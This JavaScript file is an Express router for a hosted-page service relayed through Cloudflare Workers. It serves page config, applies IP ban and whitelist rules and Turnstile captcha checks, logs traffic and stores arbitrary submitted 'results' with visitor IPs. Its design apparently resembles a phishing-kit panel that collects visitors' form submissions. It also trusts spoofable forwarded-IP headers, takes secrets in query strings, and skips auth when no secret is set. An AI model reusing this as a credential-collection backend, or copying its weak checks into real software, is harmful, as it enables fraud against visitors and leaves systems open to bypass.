import { Router } from "express";
import {
  findUserPage,
  savePageResult,
  saveTrafficEvent,
  updateUserPageConfig
} from "../repositories/appRepository.js";
import {
  publicTurnstileConfig,
  turnstileSecretFor,
  verifyTurnstileToken
} from "../services/turnstile.js";

export const runtimeRouter = Router();

function requestIp(req) {
  return req.headers["cf-connecting-ip"]
    || req.headers["x-forwarded-for"]?.split(",")[0]?.trim()
    || req.socket.remoteAddress
    || "unknown";
}

function normalizeHost(value = "") {
  return String(value)
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, "")
    .replace(/\/.*$/, "")
    .replace(/:\d+$/, "");
}

function relaySecretFor(page) {
  return page?.hostingConfig?.relaySecret
    || page?.hostingConfig?.cloudflareRelaySecret
    || page?.generatedFile?.relaySecret
    || "";
}

function allowedHostsFor(page) {
  return Array.from(new Set([
    page?.domain,
    page?.hostingConfig?.domain
  ].map(normalizeHost).filter(Boolean)));
}

function publicPageConfig(page) {
  const security = page.securityConfig || {};
  return {
    id: page.id,
    pageId: page.slug,
    pageName: page.name,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    domain: page.domain,
    status: page.status,
    subscription: page.subscription,
    hosting: {
      domain: page.hostingConfig?.domain || page.domain || "",
      hostingType: page.hostingConfig?.hostingType || "cpanel",
      installPath: page.hostingConfig?.installPath || "public_html",
      connectionType: page.hostingConfig?.connectionType || "cloudflare-worker",
      relayVerified: Boolean(page.hostingConfig?.relayVerified)
    },
    security: {
      domains: allowedHostsFor(page),
      captcha: Boolean(security.captcha),
      turnstile: publicTurnstileConfig(security),
      bannedIps: security.bannedIps || [],
      whitelistIps: security.whitelistIps || []
    },
    resultSettings: page.resultSettings || {},
    generatedFile: page.generatedFile || {},
    flow: page.flow || [],
    configs: page.configs || {}
  };
}

async function runtimeContext(req, res) {
  const userPageId = req.body?.userPageId || req.query?.userPageId || req.body?.pageId || req.query?.pageId;
  const page = await findUserPage(userPageId);
  if (!page) {
    res.status(404).json({ error: "Runtime page not found" });
    return null;
  }

  const expectedSecret = relaySecretFor(page);
  const providedSecret = req.headers["x-deuce-relay-secret"] || req.body?.relaySecret || req.query?.relaySecret;
  if (expectedSecret && providedSecret !== expectedSecret) {
    res.status(403).json({ error: "Relay secret rejected" });
    return null;
  }

  const clientHost = normalizeHost(req.headers["x-deuce-client-host"] || req.body?.hostname || req.query?.hostname || req.headers.origin || req.headers.host);
  const allowedHosts = allowedHostsFor(page);
  if (allowedHosts.length && clientHost && !allowedHosts.includes(clientHost)) {
    res.status(403).json({ error: "Domain not authorized", host: clientHost });
    return null;
  }

  return { page, clientHost, ip: requestIp(req) };
}

function securityDecision(page, ip) {
  const security = page.securityConfig || {};
  const bannedIps = security.bannedIps || [];
  const whitelistIps = security.whitelistIps || [];
  if (whitelistIps.includes(ip)) return { allowed: true, reason: "IP whitelisted" };
  if (bannedIps.includes(ip)) return { allowed: false, reason: "IP blocked by page security rules" };
  if (page.status && page.status !== "active") return { allowed: false, reason: "Page subscription is not active" };
  return { allowed: true, reason: "Allowed" };
}

runtimeRouter.get("/config", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  res.json({ config: publicPageConfig(context.page) });
});

runtimeRouter.post("/config", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  res.json({ config: publicPageConfig(context.page) });
});

runtimeRouter.post("/security/check", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip);
  res.json({ ...decision, ip: context.ip, host: context.clientHost });
});

runtimeRouter.post("/verify-human", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip);
  if (!decision.allowed) {
    res.status(403).json({ verified: false, reason: decision.reason });
    return;
  }

  const security = context.page.securityConfig || {};
  if (!security.captcha) {
    res.json({ verified: true, skipped: true });
    return;
  }

  const result = await verifyTurnstileToken({
    token: req.body?.token || req.body?.["cf-turnstile-response"],
    secret: turnstileSecretFor(security),
    remoteIp: context.ip
  });
  res.status(result.success ? 200 : 400).json({
    verified: result.success,
    reason: result.error || (result.success ? "Verified" : "Turnstile verification failed")
  });
});

runtimeRouter.post("/traffic", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip);
  const event = await saveTrafficEvent({
    ...req.body,
    userPageId: context.page.id,
    pageId: context.page.slug,
    hostname: context.clientHost || req.body?.hostname,
    result: req.body?.result || (decision.allowed ? "allowed" : "blocked"),
    reason: req.body?.reason || decision.reason
  }, context.ip, req.headers["user-agent"]);
  res.status(201).json({ event, allowed: decision.allowed, reason: decision.reason });
});

runtimeRouter.post("/results", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip);
  if (!decision.allowed) {
    res.status(403).json({ error: decision.reason });
    return;
  }
  const result = await savePageResult({
    ...req.body,
    userPageId: context.page.id,
    pageId: context.page.slug,
    pageName: context.page.name,
    hostname: context.clientHost || req.body?.hostname
  }, context.ip, req.headers["user-agent"]);
  res.status(201).json({ result });
});

runtimeRouter.post("/relay/verify", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const hostingConfig = {
    ...(context.page.hostingConfig || {}),
    relayVerified: true,
    relayVerifiedAt: new Date().toISOString(),
    verified: true,
    verifiedAt: new Date().toISOString(),
    liveStatus: "Live"
  };
  await updateUserPageConfig(context.page.id, { hostingConfig });
  res.json({ ok: true, host: context.clientHost, userPageId: context.page.id });
});
